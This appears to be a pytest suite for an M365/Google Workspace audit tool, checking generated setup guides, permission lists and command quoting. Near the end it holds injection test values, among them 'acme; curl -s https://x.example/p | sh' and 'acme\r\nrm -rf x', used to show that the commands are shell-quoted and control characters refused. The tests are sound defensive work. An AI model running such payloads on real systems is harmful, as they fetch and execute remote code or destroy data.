from __future__ import annotations

import json
import shlex
from pathlib import Path

import pytest

from auditex import cli as auditex_cli
from auditex.mcp_registry import iter_tool_specs
from auditex.mcp_server import setup_guide as mcp_setup_guide
from auditex.setup_guide import build_setup_guide, render_setup_guide_markdown
from azure_tenant_audit import cli as tenant_cli


def test_google_setup_guide_outputs_dwd_scopes_and_readonly_claims() -> None:
    payload = build_setup_guide(provider="google", collector_preset="everything", auth="domain-delegation")

    assert payload["provider"] == "google_workspace"
    assert "google_drive_posture" in payload["selected_collectors"]
    assert "https://www.googleapis.com/auth/admin.reports.audit.readonly" in payload["required_scopes"]
    assert "https://www.googleapis.com/auth/drive.metadata.readonly" in payload["scopes_csv"]
    assert payload["provider_assertions"]["drive_file_content_reads"] is False
    assert any(row["scope"] == "https://www.googleapis.com/auth/gmail.settings.basic" for row in payload["scope_warnings"])
    assert "gmail.settings.sharing" not in payload["scopes_csv"]
    assert "Domain-wide delegation" in " ".join(payload["setup_steps"])


def test_m365_setup_guide_outputs_permissions_roles_and_commands() -> None:
    payload = build_setup_guide(provider="m365", auditor_profile="global-reader", collector_preset="full", tenant_id="contoso.onmicrosoft.com")

    assert payload["provider"] == "m365"
    assert payload["mode"] == "app" and payload["credential"] == "reader app with a certificate"
    assert payload["permissions_guide"] == "docs/guides/reader-app-permissions.md"
    assert "identity" in payload["selected_collectors"]
    assert "Policy.Read.All" in payload["graph_permissions"]
    assert "Global Reader" in payload["minimum_role_hints"]
    assert payload["provider_assertions"]["production_writes"] is False
    assert set(payload["commands"]) == {"probe", "run"}
    assert "docs/guides/reader-app-permissions.md" in payload["setup_steps"][0]
    text = json.dumps(payload)
    for removed in ("az login", "--use-azure-cli-token", "--client-secret", "<client-secret>", "delegated_", "m365 login"):
        assert removed not in text


def test_m365_setup_guide_takes_no_sign_in_mode() -> None:
    for keyword in ("mode", "include_exchange"):
        with pytest.raises(TypeError):
            build_setup_guide(provider="m365", **{keyword: "delegated"})
    args = auditex_cli._build_setup_guide_parser().parse_args(["m365", "--mode", "app"])
    assert args.mode == "app"
    with pytest.raises(SystemExit):
        auditex_cli._build_setup_guide_parser().parse_args(["m365", "--mode", "delegated"])


def test_setup_guide_markdown_includes_commands_and_sources() -> None:
    payload = build_setup_guide(provider="google", collector_preset="identity")
    markdown = render_setup_guide_markdown(payload)

    assert "# Auditex Setup Guide: google_workspace" in markdown
    assert "```text" in markdown
    assert "auditex google probe" in markdown
    assert "Google Workspace domain-wide delegation" in markdown


def test_setup_guide_cli_json_and_markdown(capsys) -> None:
    assert auditex_cli.main(["setup-guide", "google", "--collector-preset", "identity", "--format", "json"]) == 0
    google_payload = json.loads(capsys.readouterr().out)
    assert google_payload["provider"] == "google_workspace"
    assert "scopes_csv" in google_payload

    assert auditex_cli.main(["setup-guide", "m365", "--collector-preset", "identity-only", "--format", "md"]) == 0
    markdown = capsys.readouterr().out
    assert "Microsoft Graph Permissions" in markdown
    assert "Directory.Read.All" in markdown


def test_setup_guide_mcp_tool_is_registered_and_callable() -> None:
    names = {row["name"] for row in iter_tool_specs()}
    assert "auditex_setup_guide" in names

    payload = mcp_setup_guide(provider="m365", collector_preset="identity-only")
    assert payload["provider"] == "m365"
    assert payload["permissions_guide"] == "docs/guides/reader-app-permissions.md"
    with pytest.raises(TypeError):
        mcp_setup_guide(provider="m365", mode="delegated")  # type: ignore[call-arg]
    assert "Application.Read.All" in payload["graph_permissions"]
    artifact_paths = {row["artifact_path"] for row in payload["citations"]}
    assert "src/auditex/setup_guide.py" in artifact_paths
    assert "configs/collector-definitions.json" in artifact_paths


def test_m365_setup_guide_lists_signin_and_report_settings_scopes() -> None:
    payload = build_setup_guide(provider="m365", auditor_profile="global-reader", collector_preset="full")

    assert "reports_usage" in payload["selected_collectors"]
    assert "ReportSettings.Read.All" in payload["graph_permissions"]
    assert "AuditLog.Read.All" in payload["graph_permissions"]
    assert "CloudApp-Discovery.Read.All" not in payload["graph_permissions"]
    assert not [scope for scope in payload["graph_permissions"] if "ReadWrite" in scope]
    rows = {row["collector"]: row for row in payload["collector_permissions"]}
    assert "AuditLog.Read.All" in rows["identity"]["required_permissions"]
    assert "ReportSettings.Read.All" in rows["reports_usage"]["required_permissions"]
    markdown = render_setup_guide_markdown(payload)
    assert "ReportSettings.Read.All" in markdown


def test_m365_setup_guide_defender_cloud_apps_uses_consent_request_scope() -> None:
    payload = build_setup_guide(provider="m365", collectors=["defender_cloud_apps"])

    assert payload["selected_collectors"] == ["defender_cloud_apps"]
    assert payload["graph_permissions"] == ["ConsentRequest.Read.All"]


def test_optional_power_platform_setup_notes_are_selected_only_on_opt_in():
    optional = build_setup_guide(provider="m365", collector_preset="power-platform", plane="inventory")
    rows = {row["collector"]: row for row in optional["collector_permissions"]}
    assert optional["selected_collectors"] == ["identity", "licensing", "power_platform", "power_bi"]
    for name in ("power_platform", "power_bi"):
        assert rows[name]["required_permissions"] == []
        assert "off by default" in rows[name]["notes"]
        assert "write-capable admin role used read-only" in rows[name]["notes"]
        assert "no delegated token path" in rows[name]["notes"]
    assert "New-PowerAppManagementApp -ApplicationId <app id>" in rows["power_platform"]["notes"]
    assert "Power Platform Administrator role assigned" in rows["power_platform"]["notes"]
    assert "Remove-PowerAppManagementApp -ApplicationId <app id>" in rows["power_platform"]["notes"]
    assert "UNKNOWN" not in rows["power_platform"]["notes"]
    assert "https://service.powerapps.com//.default" in rows["power_platform"]["notes"]
    assert "TENANT_SETTINGS_METHOD is POST and no other POST is sent" in rows["power_platform"]["notes"]
    assert "https://analysis.windows.net/powerbi/api/.default" in rows["power_bi"]["notes"]
    assert "Service principals can access read-only admin APIs" in rows["power_bi"]["notes"]
    assert "never grant Tenant.Read.All" in rows["power_bi"]["notes"]
    baseline = build_setup_guide(provider="m365", collector_preset="full")
    assert "New-PowerAppManagementApp" not in json.dumps(baseline)
    assert "Service principals can access read-only admin APIs" not in json.dumps(baseline)
    # The opt-in adds no Graph permission beyond identity and licensing.
    supporting = build_setup_guide(provider="m365", collectors=["identity", "licensing"])
    assert optional["graph_permissions"] == supporting["graph_permissions"]


@pytest.mark.parametrize("selection", [
    {"collector_preset": "power-platform"},
    {"collectors": ["identity", "licensing", "power_platform", "power_bi"]},
    {"collectors": "identity,power_platform"},
    {"collectors": ["power_bi"]},
    {"collector_preset": "power-platform", "exclude": ["power_bi"]},
    {"collector_preset": "full", "collectors": ["power_bi", "identity"]},
])
def test_optional_setup_commands_preserve_resolved_selection(selection) -> None:
    payload = build_setup_guide(provider="m365", plane="inventory", **selection)
    commands = payload["commands"]
    probe = auditex_cli._build_probe_parser().parse_args(shlex.split(commands["probe"])[2:])
    run = tenant_cli.build_parser().parse_args(shlex.split(commands["run"])[2:])

    assert probe.mode == "app"
    assert probe.surface.split(",") == [*payload["selected_collectors"], "windows365"]
    assert run.collectors.split(",") == payload["selected_collectors"]
    assert run.collector_preset == selection.get("collector_preset")
    assert run.plane == "inventory"
    assert run.client_id == probe.client_id == "<app-id>"
    assert run.certificate_path == probe.certificate_path == "<private-key-file>"
    assert run.certificate_thumbprint == probe.certificate_thumbprint == "<sha1-thumbprint>"


@pytest.mark.parametrize("selection", [
    {},
    {"collector_preset": "full"},
    {"collectors": ["identity", "licensing"]},
    {"collector_preset": "power-platform", "exclude": ["power_platform", "power_bi"]},
])
def test_setup_commands_without_power_collectors_preserve_requested_scope(selection) -> None:
    payload = build_setup_guide(provider="m365", **selection)
    probe = auditex_cli._build_probe_parser().parse_args(shlex.split(payload["commands"]["probe"])[2:])
    run = tenant_cli.build_parser().parse_args(shlex.split(payload["commands"]["run"])[2:])
    assert run.auditor_profile == probe.auditor_profile == "global-reader"
    assert run.plane == "full" and probe.mode == "app"
    assert run.collectors.split(",") == payload["selected_collectors"]
    assert probe.surface.split(",") == [*run.collectors.split(","), "windows365"]
    assert {"power_platform", "power_bi"}.isdisjoint(payload["selected_collectors"])


def test_documented_optional_run_and_probe_examples_parse() -> None:
    guide = (Path(__file__).resolve().parents[1] / "docs/guides/admin-permission-guide.md").read_text()
    optional = guide.split("## Power Platform and Power BI (optional)", 1)[1]
    examples = [block.split("```", 1)[0] for block in optional.split("```bash\n")[1:]]
    run_words, probe_words = [shlex.split(example.replace("\\\n", "")) for example in examples[:2]]
    assert run_words[:2] == ["auditex", "run"]
    assert probe_words[:3] == ["auditex", "probe", "live"]
    run = tenant_cli.build_parser().parse_args(run_words[2:])
    probe = auditex_cli._build_probe_parser().parse_args(probe_words[2:])
    assert run.collector_preset == "power-platform"
    assert run.plane == "inventory"
    assert probe.mode == "app"
    assert probe.surface == "identity,licensing,power_platform,power_bi"


def test_default_setup_discloses_sessions_public_resolver_and_failures():
    guide = build_setup_guide(provider="m365")
    text = render_setup_guide_markdown(guide)
    for phrase in ("Exchange Online PowerShell session", "Exchange.ManageAsApp", "Global Reader",
                   "Cloudflare", "https://cloudflare-dns.com/dns-query",
                   "Only domain names, no user data", "MTA-STS", "OpenID discovery", "verified domains",
                   "--exclude exchange_policy,dns_posture", "not assessed", "partial",
                   "Exchange accepted domains", "coexistence excluded", "Email service",
                   "docs/guides/reader-app-permissions.md"):
        assert phrase in text
    assert {"exchange_policy", "dns_posture", "teams_policy"} <= set(guide["selected_collectors"])
    assert "Exchange.ManageAsApp" not in guide["graph_permissions"]
    assert guide["exchange_application_permissions"] == ["Exchange.ManageAsApp"]
    assert {"pwsh", "ExchangeOnlineManagement"} <= set(guide["tool_requirements"])
    warning = next(row for row in guide["scope_warnings"] if row["permission"] == "Exchange.ManageAsApp")
    assert warning["risk"] == "write_capable"
    for phrase in ("read-only Get-*", "no mutating cmdlet", "Global Reader only"):
        assert phrase in warning["note"]
    assert "## Delegated" not in text and "client secret" not in text.replace("no client secret", "")


@pytest.mark.parametrize("exclude", ["exchange_policy", "dns_posture", "exchange_policy,dns_posture"])
def test_setup_guide_deselection_survives_generated_run_commands(tmp_path, exclude):
    from azure_tenant_audit.config import CollectorConfig
    from azure_tenant_audit.presets import load_collector_presets
    from azure_tenant_audit.run import build_live_run_plan

    guide = build_setup_guide(provider="m365", exclude=exclude)
    assert set(exclude.split(",")).isdisjoint(guide["selected_collectors"])
    args = auditex_cli._build_probe_parser().parse_args(shlex.split(guide["commands"]["probe"])[2:])
    assert args.surface.split(",") == [*guide["selected_collectors"], "windows365"]
    args = tenant_cli.build_parser().parse_args(shlex.split(guide["commands"]["run"])[2:])
    plan = build_live_run_plan(args, output_dir=tmp_path,
                               collector_config=CollectorConfig.from_path(Path("configs/collector-definitions.json")),
                               permission_hints={}, collector_presets=load_collector_presets())
    assert plan.selected_collectors == guide["selected_collectors"]


@pytest.mark.parametrize("collectors", ["exchange_policy", "dns_posture", "exchange_policy,dns_posture"])
def test_setup_explicit_selection_reaches_the_run_command(collectors):
    guide = build_setup_guide(provider="m365", collectors=collectors)
    assert guide["selected_collectors"] == collectors.split(",")
    assert f"--collectors {collectors}" in guide["commands"]["run"]


def test_exchange_reader_profile_reads_exchange_with_the_certificate_only(tmp_path):
    from azure_tenant_audit.config import CollectorConfig
    from azure_tenant_audit.presets import load_collector_presets
    from azure_tenant_audit.run import build_live_run_plan

    guide = build_setup_guide(provider="m365", auditor_profile="exchange-reader", exclude="security,identity")
    assert guide["selected_collectors"] == ["exchange_policy"]
    assert "m365_cli" not in guide["tool_requirements"]
    args = tenant_cli.build_parser().parse_args(shlex.split(guide["commands"]["run"])[2:])
    plan = build_live_run_plan(args, output_dir=tmp_path,
                               collector_config=CollectorConfig.from_path(Path("configs/collector-definitions.json")),
                               permission_hints={}, collector_presets=load_collector_presets())
    assert plan.selected_collectors == guide["selected_collectors"]


@pytest.mark.parametrize("selection", [
    {"collectors": "identity", "exclude": "identity"},
    {"auditor_profile": "exchange-reader", "exclude": "exchange_policy,security,identity"},
])
def test_setup_guide_rejects_an_empty_selection(selection):
    with pytest.raises(ValueError, match="No collectors selected"):
        build_setup_guide(provider="m365", **selection)


RETIRED_LIVE_TERMS = ("m365 ", "CLI session", "CLI-driven", "authenticated M365", "Microsoft 365 CLI tenant")


def _retired_live_terms(guide: dict) -> list[str]:
    text = json.dumps(guide) + render_setup_guide_markdown(guide)
    return [term for term in RETIRED_LIVE_TERMS if term in text]


@pytest.mark.parametrize("selection", [
    {"auditor_profile": "app-readonly-full"},
    {"collectors": "purview"},
    {"collectors": "ediscovery"},
    {"collectors": "purview,ediscovery"},
    {"collectors": "exchange"},
])
def test_guides_carry_no_cli_for_microsoft_365_requirement(selection):
    """REV-M09-T03 change 2: no guide asks for m365, an authenticated CLI session or a retired command."""
    guide = build_setup_guide(provider="m365", **selection)
    assert "m365" not in guide["tool_requirements"] and "m365_cli" not in guide["tool_requirements"]
    assert not [command for command in guide["optional_commands"] if command.startswith("m365")]
    for row in guide["collector_permissions"]:
        assert "m365" not in row["tool_requirements"], row["collector"]
    assert _retired_live_terms(guide) == []


def test_extended_profile_guide_names_the_purview_and_ediscovery_gaps():
    guide = build_setup_guide(provider="m365", auditor_profile="app-readonly-full")
    assert {"purview", "ediscovery"} <= set(guide["selected_collectors"])
    assert "exchange" not in guide["selected_collectors"]
    markdown = render_setup_guide_markdown(guide)
    (purview,) = [step for step in guide["setup_steps"] if step.startswith("purview: ")]
    (ediscovery,) = [step for step in guide["setup_steps"] if step.startswith("ediscovery: ")]
    assert "Named gap" in purview and "m365_cli_not_used" in purview and "reads no Purview data" in purview
    assert "Microsoft Graph with the reader app's certificate" in ediscovery and "Named gap" in ediscovery
    assert purview in markdown and ediscovery in markdown


@pytest.mark.parametrize(("collector", "permissions", "phrase"), [
    ("purview", ["AuditLog.Read.All"], "reads no Purview data"),
    ("ediscovery", ["eDiscovery.Read.All", "SecurityIncident.Read.All"], "read through Microsoft Graph"),
    ("exchange", [], "reads nothing"),
])
def test_explicit_purview_and_ediscovery_guides_describe_certificate_reads(collector, permissions, phrase):
    guide = build_setup_guide(provider="m365", collectors=collector)
    assert guide["selected_collectors"] == [collector]
    assert guide["graph_permissions"] == permissions
    assert guide["tool_requirements"] == [] and guide["optional_commands"] == []
    (row,) = guide["collector_permissions"]
    assert phrase in row["notes"] and "m365_cli_not_used" in row["notes"]
    assert [step for step in guide["setup_steps"] if step.startswith(f"{collector}: ")] == [f"{collector}: {row['notes']}"]
    assert "--certificate-path" in guide["commands"]["run"] and f"--collectors {collector}" in guide["commands"]["run"]


def test_exchange_tooling_follows_explicit_selection_in_other_profiles():
    guide = build_setup_guide(provider='m365', auditor_profile='security-reader', collectors='exchange_policy')
    assert {'pwsh', 'ExchangeOnlineManagement'} <= set(guide['tool_requirements'])


def test_app_setup_counts_certificate_setup_sign_ins_apart_from_the_audit():
    """DEC-065: the guide states the one-time set-up sign-in and the zero sign-ins of a certificate audit."""
    guide = build_setup_guide(provider="m365")
    (step,) = [step for step in guide["setup_steps"] if step.startswith("Sign-ins,")]
    setup, audit = step.split("The audit itself", 1)
    assert "one administrator sign-in to the Microsoft Entra admin centre" in setup
    assert "certificate upload" in setup and "needs none" in setup
    assert audit.startswith(" takes no interactive sign-in") and "silently from the certificate" in audit
    assert step in render_setup_guide_markdown(guide)
    assert "--certificate-path" in guide["commands"]["run"]


def _reader_app_guide_check_command() -> list[str]:
    guide = (Path(__file__).resolve().parents[1] / "docs/guides/reader-app-permissions.md").read_text(encoding="utf-8")
    step = guide.split("## Step 7: Check it worked", 1)[1]
    block = step.split("```sh\n", 1)[1].split("```", 1)[0]
    values = {
        "<directory (tenant) id>": "contoso.onmicrosoft.com",
        "<application (client) id>": "00000000-0000-0000-0000-000000000001",
        "<thumbprint>": "0123456789ABCDEF0123456789ABCDEF01234567",
    }
    for placeholder, value in values.items():
        block = block.replace(placeholder, value)
    assert "<" not in block, "the step 7 command has a placeholder this test does not know"
    return shlex.split(block.replace("\\\n", " "))


def test_reader_app_guide_check_command_parses_with_the_certificate():
    words = _reader_app_guide_check_command()
    assert words[:2] == ["auditex", "run"]
    args = tenant_cli.build_parser().parse_args(words[2:])
    assert args.certificate_path == "auditex-reader.key.pem"
    assert args.certificate_thumbprint == "0123456789ABCDEF0123456789ABCDEF01234567"
    assert args.client_id == "00000000-0000-0000-0000-000000000001"
    from azure_tenant_audit.config import CollectorConfig

    known = set(CollectorConfig.from_path(Path("configs/collector-definitions.json")).default_order)
    assert set(args.collectors.split(",")) <= known


def test_reader_app_guide_check_command_reaches_the_certificate_check(tmp_path, monkeypatch, caplog):
    """Through `auditex run` the step 7 command gets to the certificate load: a missing key stops it, with no run folder."""
    monkeypatch.chdir(tmp_path)
    words = _reader_app_guide_check_command()
    with caplog.at_level("ERROR"):
        rc = auditex_cli.main(words[1:])
    assert rc == 2
    assert "The certificate key file could not be used" in caplog.text
    assert not (tmp_path / "audit-output").exists()


# R097: values are shell-quoted in the verification commands, so a path with a space stays one argument and a value
# carrying shell syntax cannot add a pipeline to a command the operator pastes.
INJECTED = "acme; curl -s https://x.example/p | sh"


@pytest.mark.parametrize("auth", ["domain-delegation", "oauth"])
def test_google_commands_quote_every_value(auth: str) -> None:
    guide = build_setup_guide(
        provider="google", auth=auth, tenant_name=INJECTED, service_account_key="/data/My Keys/sa.json",
        oauth_client="/data/My Keys/client.json", token_cache="cache dir/token.json", subject="a b@example.com",
        domain="example.com", customer_id="C0 1",
    )
    for name, command in guide["commands"].items():
        argv = shlex.split(command)
        assert not {"|", ";", "sh", "curl"} & set(argv), name
        if name != "doctor":
            assert argv[argv.index("--tenant-name") + 1] == INJECTED
        if auth == "domain-delegation":
            assert argv[argv.index("--service-account-key") + 1] == "/data/My Keys/sa.json"
            assert argv[argv.index("--subject") + 1] == "a b@example.com"
        else:
            assert argv[argv.index("--oauth-client") + 1] == "/data/My Keys/client.json"
            assert argv[argv.index("--token-cache") + 1] == "cache dir/token.json"
        assert argv[argv.index("--customer-id") + 1] == "C0 1"


def test_m365_commands_quote_every_value() -> None:
    guide = build_setup_guide(provider="m365", tenant_name=INJECTED, tenant_id="contoso.onmicrosoft.com; id", collectors="identity")
    for name, command in guide["commands"].items():
        argv = shlex.split(command)
        assert not {"|", ";", "sh", "curl", "id"} & set(argv), name
        assert argv[argv.index("--tenant-name") + 1] == INJECTED
        assert argv[argv.index("--tenant-id") + 1] == "contoso.onmicrosoft.com; id"


# R060: the SharePoint application permission sharepoint_admin needs is named in the plan with its blast radius.
def test_sharepoint_admin_plan_names_sites_fullcontrol_with_its_blast_radius() -> None:
    guide = build_setup_guide(provider="m365", collectors="sharepoint_admin,identity")

    assert guide["sharepoint_application_permissions"] == ["Sites.FullControl.All"]
    warnings = {row["permission"]: row for row in guide["scope_warnings"]}
    assert warnings["Sites.FullControl.All"]["risk"] == "write_capable"
    assert "full control of every site" in warnings["Sites.FullControl.All"]["note"]
    assert guide["provider_assertions"]["broad_permissions_recorded_as_scope_risk"] is True
    markdown = render_setup_guide_markdown(guide)
    assert "## SharePoint Application Permissions" in markdown
    assert "`Sites.FullControl.All` (Office 365 SharePoint Online, not Microsoft Graph)" in markdown
    assert "- `Sites.FullControl.All`: " in markdown.split("## Scope Risk Notes", 1)[1]


def test_a_plan_without_sharepoint_admin_names_no_sharepoint_application_permission() -> None:
    guide = build_setup_guide(provider="m365", collectors="identity")
    assert guide["sharepoint_application_permissions"] == []
    assert "FullControl" not in json.dumps(guide)


def test_fullcontrol_is_a_write_capable_token() -> None:
    from auditex.setup_guide import M365_WRITE_CAPABLE_TOKENS

    assert any(token in "Sites.FullControl.All" for token in M365_WRITE_CAPABLE_TOKENS)


@pytest.mark.parametrize(
    "arguments",
    [
        {"provider": "m365", "tenant_id": "contoso.onmicrosoft.com\n```\n# pasted", "collectors": "identity"},
        {"provider": "m365", "tenant_name": "acme\r\nrm -rf x", "collectors": "identity"},
        {"provider": "google", "subject": "admin@example.com\n```"},
        {"provider": "google", "service_account_key": "key.json\x1b[2K"},
    ],
)
def test_command_values_with_line_breaks_or_control_characters_are_refused(arguments: dict) -> None:
    """Review round 1: a line break could close the Markdown command fence of the rendered guide."""
    with pytest.raises(ValueError, match="control character"):
        build_setup_guide(**arguments)
